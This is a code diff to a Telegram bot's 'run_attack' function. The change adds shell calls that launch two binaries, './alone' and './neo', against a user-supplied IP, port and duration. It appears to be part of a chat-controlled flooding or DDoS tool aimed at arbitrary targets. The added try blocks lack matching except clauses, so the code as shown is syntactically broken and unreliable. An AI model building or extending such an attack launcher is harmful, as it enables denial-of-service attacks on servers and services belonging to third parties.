@@ -70,7 +70,31 @@ async def run_attack(chat_id, ip, port, duration, context):
             print(f"[stdout]\n{stdout.decode()}")
         if stderr:
             print(f"[stderr]\n{stderr.decode()}")
+    try:
+        process = await asyncio.create_subprocess_shell(
+            f"./alone {ip} {port} {duration} 10",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
 
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+    try:
+        process = await asyncio.create_subprocess_shell(
+            f"./neo {ip} {port} {duration} 10",
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE
+        )
+        stdout, stderr = await process.communicate()
+
+        if stdout:
+            print(f"[stdout]\n{stdout.decode()}")
+        if stderr:
+            print(f"[stderr]\n{stderr.decode()}")
+            
     except Exception as e:
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
 
